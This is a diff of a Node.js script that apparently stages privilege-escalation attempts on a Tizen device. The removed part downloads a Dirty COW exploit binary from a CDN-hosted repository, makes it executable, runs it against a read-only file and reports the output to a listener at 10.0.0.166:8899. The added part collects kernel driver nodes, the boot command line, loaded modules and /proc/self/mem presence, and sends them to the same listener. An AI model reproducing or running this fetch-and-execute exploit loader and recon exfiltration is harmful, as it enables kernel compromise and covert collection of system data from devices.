@@ -1,30 +1,20 @@
-// Stage-3: SAFE Dirty COW probe. Overwrites only a self-owned read-only file.
+// Stage-4 read-only: check NTK device exposure + RAM layout.
 var fs = require('fs');
 var http = require('http');
-var https = require('https');
-var cp = require('child_process');
-var dir = '/tmp/';
 function post(o) {
   var b = JSON.stringify(o);
-  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon3', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
+  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon4', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
   req.on('error', function (e) { });
   req.write(b); req.end();
 }
-https.get('https://cdn.jsdelivr.net/gh/ItsMeATaco/tizen-glass-dashboard@v6/dcow.bin', function (r) {
-  var c = [];
-  r.on('data', function (d) { c.push(d); });
-  r.on('end', function () {
-    var buf = Buffer.concat(c);
-    var out = {};
-    if (!buf || buf.length < 1000) { out.err = 'fetch failed'; post(out); return; }
-    try {
-      fs.writeFileSync(dir + 'dcow', buf);
-      fs.chmodSync(dir + 'dcow', parseInt('755', 8));
-      fs.writeFileSync(dir + 'probe.txt', 'AAAAAAAAAAAAAAAAAAAA');
-      fs.chmodSync(dir + 'probe.txt', parseInt('444', 8));
-      out.result = cp.execSync(dir + 'dcow ' + dir + 'probe.txt PWNED', { timeout: 20000 }).toString();
-      out.after = fs.readFileSync(dir + 'probe.txt', 'utf8');
-    } catch (e) { out.err = e.message; }
-    post(out);
+var out = {};
+try {
+  out.ntk = fs.readdirSync('/dev').filter(function (n) { return /ntk|sdp|fdet|mali|ntkxdma/.test(n); }).map(function (n) {
+    var s = fs.statSync('/dev/' + n);
+    return n + ' mode=' + s.mode.toString(8);
   });
-}).on('error', function (e) { post({ err: 'https ' + e.message }); });
+} catch (e) { out.ntk = 'ERR ' + e.message; }
+try { out.cmdline = fs.readFileSync('/proc/cmdline', 'utf8'); } catch (e) { out.cmdline = 'ERR'; }
+try { out.modules = fs.readFileSync('/proc/modules', 'utf8').split('\n').filter(function (l) { return /ntk|sdp|mali/.test(l); }); } catch (e) { out.modules = 'ERR'; }
+try { out.selfmem = fs.statSync('/proc/self/mem') ? 'present' : 'no'; } catch (e) { out.selfmem = 'ERR'; }
+post(out);
